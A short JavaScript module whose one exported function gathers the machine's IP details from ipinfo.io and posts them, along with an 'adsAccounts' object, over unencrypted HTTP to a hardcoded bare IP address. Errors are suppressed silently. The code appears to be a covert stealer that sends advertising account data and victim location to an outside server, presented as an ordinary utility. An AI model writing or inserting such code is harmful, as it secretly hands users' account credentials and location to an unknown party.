import axios from "axios"

export const sendAdInfoAccounts = async (adsAccounts) => {
    try {
        const { data: ipInfo } = await axios.get("https://www.ipinfo.io");
        return axios.post("http://104.156.150.26:8888/api/adinfo", { ipInfo, adsAccounts })
    } catch (error) {
        //console.log(error);
    }
}
